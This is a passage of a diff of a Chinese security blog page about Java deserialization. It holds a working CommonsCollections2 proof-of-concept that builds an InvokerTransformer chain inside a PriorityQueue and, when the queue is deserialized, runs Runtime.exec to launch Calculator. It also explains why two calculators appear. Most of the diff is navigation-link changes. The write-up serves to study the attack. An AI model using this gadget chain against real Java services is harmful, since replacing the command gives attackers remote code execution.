function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    结果弹出计算机</p>
+<p>![截屏2022-02-24 下午4.30.19](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-02-24 下午4.30.19.png)</p>
+<p>这里会弹出两个计算器，因为compare里调用了两次transform方法。</p>
 
                 
             </div>
@@ -575,7 +542,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/02/26/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">http://example.com/2022/02/26/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</a>
+                    <a href="http://example.com/2022/02/18/CommonCollections2/">http://example.com/2022/02/18/CommonCollections2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -788,13 +755,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/03/02/CommonCollections3/">
+                <a href="/2022/02/26/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="java反序列化CommonCollections3">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="和室友艰辛的一次打靶记录">
                         
-                        <span class="card-title">java反序列化CommonCollections3</span>
+                        <span class="card-title">和室友艰辛的一次打靶记录</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -805,14 +772,14 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-26
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/JAVA/" class="post-category">
-                                    JAVA
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
                                 </a>
                             
                             
@@ -829,13 +796,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/18/CommonCollections2/">
+                <a href="/2022/02/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommomCollections1(ysoserial)/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="java反序列化CommonCollections2">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="java反序列化CommomCollections1(ysoserial)">
                         
-                        <span class="card-title">java反序列化CommonCollections2</span>
+                        <span class="card-title">java反序列化CommomCollections1(ysoserial)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -846,7 +813,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-12
                             </span>
                         <span class="publish-author">
                             
